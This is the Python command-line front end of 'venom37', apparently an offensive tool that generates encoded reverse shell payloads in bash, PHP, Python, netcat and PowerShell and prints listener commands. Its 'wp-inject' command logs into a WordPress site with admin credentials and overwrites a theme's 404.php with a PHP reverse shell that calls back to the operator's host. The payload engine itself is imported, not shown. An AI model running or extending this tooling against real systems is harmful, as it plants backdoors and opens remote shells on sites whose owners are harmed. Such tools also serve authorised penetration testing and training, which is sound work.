"""CLI for venom37 — reverse shell generator."""
from __future__ import annotations

import asyncio
import json
import sys

import click


@click.group("venom")
def venom_cli():
    """venom37 — Reverse shell generator.

    Generate reverse shells in multiple languages with encoding options.
    Includes listener commands and shell stabilization instructions.
    """
    pass


@venom_cli.command("list")
@click.option("--human", is_flag=True, help="Human-readable output")
def list_shells(human):
    """List all available shell types."""
    from venom37.engine import Venom

    types = Venom.list_types()
    if human:
        click.echo("\n  Available Shell Types:")
        for t in types:
            click.echo(f"    {t['type']:20s} {t['name']:25s} [{t['platform']}]")
            click.echo(f"    {'':20s} {t['description']}")
            click.echo(f"    {'':20s} Requires: {t['requires']}")
            click.echo()
    else:
        click.echo(json.dumps(types, indent=2))


@venom_cli.command("gen")
@click.argument("shell_type")
@click.argument("lhost")
@click.argument("lport", type=int, default=4444)
@click.option("--encode", "-e", default=None, type=click.Choice(["base64", "url", "double-url"]), help="Encode the payload")
@click.option("--listener", "-l", default="nc", type=click.Choice(["nc", "socat", "pwncat", "rlwrap", "msfconsole"]), help="Listener type")
@click.option("--variant", "-V", default=None, help="Use a specific variant")
@click.option("--human", is_flag=True, help="Human-readable output")
@click.option("--explain", is_flag=True, help="Explain what the shell does")
@click.option("--with-listener", is_flag=True, help="Include listener command in output")
def gen(shell_type, lhost, lport, encode, listener, variant, human, explain, with_listener):
    """Generate a reverse shell payload.

    Examples:
      venom37 gen bash 10.0.0.1 4444
      venom37 gen php 10.0.0.1 4444 --encode base64
      venom37 gen bash 10.0.0.1 4444 --with-listener --human
    """
    from venom37.engine import Venom

    try:
        shell = Venom.generate(shell_type, lhost, lport, encode=encode,
                               listener=listener, variant=variant)
    except ValueError as e:
        click.echo(f"Error: {e}", err=True)
        sys.exit(1)

    if explain:
        click.echo(shell.explanation)
        return

    if human or with_listener:
        click.echo(shell.to_human())
    else:
        click.echo(shell.to_json())


@venom_cli.command("wp-inject")
@click.option("--target", "-t", required=True, help="WordPress base URL")
@click.option("--user", "-u", required=True, help="WordPress admin username")
@click.option("--password", "-p", required=True, help="WordPress admin password")
@click.option("--lhost", required=True, help="Your IP address")
@click.option("--lport", default=4444, help="Your listener port")
@click.option("--theme", default=None, help="Theme name (auto-detected)")
@click.option("--human", is_flag=True, help="Human-readable output")
@click.option("--explain", is_flag=True, help="Explain what this will do")
def wp_inject(target, user, password, lhost, lport, theme, human, explain):
    """Inject a PHP reverse shell into a WordPress theme (requires admin creds)."""
    from venom37.engine import Venom

    if explain:
        click.echo(
            f"I'm going to:\n"
            f"  1. Log into WordPress at {target} as '{user}'\n"
            f"  2. Open the theme editor\n"
            f"  3. Replace 404.php with a PHP reverse shell connecting to {lhost}:{lport}\n"
            f"  4. Tell you the URL to visit to trigger the shell\n\n"
            f"You'll need to run 'nc -lvnp {lport}' on your machine first."
        )
        return

    result = asyncio.run(Venom.wp_inject(target, user, password, lhost, lport, theme=theme))

    if human:
        if result["success"]:
            click.echo(f"\n  \033[92m[+] Shell injected successfully!\033[0m")
            click.echo(f"  Trigger URL: {result['trigger_url']}")
            click.echo(f"  Listener:    {result['listener_cmd']}")
            click.echo(f"\n  \033[93m[i] {result['teaching']}\033[0m\n")
        else:
            click.echo(f"\n  \033[91m[-] Injection failed: {result['error']}\033[0m\n")
    else:
        click.echo(json.dumps(result, indent=2))

    sys.exit(0 if result.get("success") else 1)


# Also allow direct invocation: venom37 bash 10.0.0.1 4444
# by making 'gen' the default command behavior
@venom_cli.command("bash", hidden=True)
@click.argument("lhost")
@click.argument("lport", type=int, default=4444)
@click.option("--encode", "-e", default=None)
@click.option("--human", is_flag=True)
@click.option("--with-listener", is_flag=True)
@click.pass_context
def shortcut_bash(ctx, lhost, lport, encode, human, with_listener):
    """Shortcut: venom37 bash <ip> <port>"""
    ctx.invoke(gen, shell_type="bash", lhost=lhost, lport=lport, encode=encode,
               human=human, with_listener=with_listener)


@venom_cli.command("php", hidden=True)
@click.argument("lhost")
@click.argument("lport", type=int, default=4444)
@click.option("--encode", "-e", default=None)
@click.option("--human", is_flag=True)
@click.option("--with-listener", is_flag=True)
@click.pass_context
def shortcut_php(ctx, lhost, lport, encode, human, with_listener):
    """Shortcut: venom37 php <ip> <port>"""
    ctx.invoke(gen, shell_type="php", lhost=lhost, lport=lport, encode=encode,
               human=human, with_listener=with_listener)


@venom_cli.command("python", hidden=True)
@click.argument("lhost")
@click.argument("lport", type=int, default=4444)
@click.option("--encode", "-e", default=None)
@click.option("--human", is_flag=True)
@click.option("--with-listener", is_flag=True)
@click.pass_context
def shortcut_python(ctx, lhost, lport, encode, human, with_listener):
    """Shortcut: venom37 python <ip> <port>"""
    ctx.invoke(gen, shell_type="python", lhost=lhost, lport=lport, encode=encode,
               human=human, with_listener=with_listener)


@venom_cli.command("nc", hidden=True)
@click.argument("lhost")
@click.argument("lport", type=int, default=4444)
@click.option("--encode", "-e", default=None)
@click.option("--human", is_flag=True)
@click.option("--with-listener", is_flag=True)
@click.pass_context
def shortcut_nc(ctx, lhost, lport, encode, human, with_listener):
    """Shortcut: venom37 nc <ip> <port>"""
    ctx.invoke(gen, shell_type="nc", lhost=lhost, lport=lport, encode=encode,
               human=human, with_listener=with_listener)


@venom_cli.command("powershell", hidden=True)
@click.argument("lhost")
@click.argument("lport", type=int, default=4444)
@click.option("--encode", "-e", default=None)
@click.option("--human", is_flag=True)
@click.option("--with-listener", is_flag=True)
@click.pass_context
def shortcut_powershell(ctx, lhost, lport, encode, human, with_listener):
    """Shortcut: venom37 powershell <ip> <port>"""
    ctx.invoke(gen, shell_type="powershell", lhost=lhost, lport=lport, encode=encode,
               human=human, with_listener=with_listener)
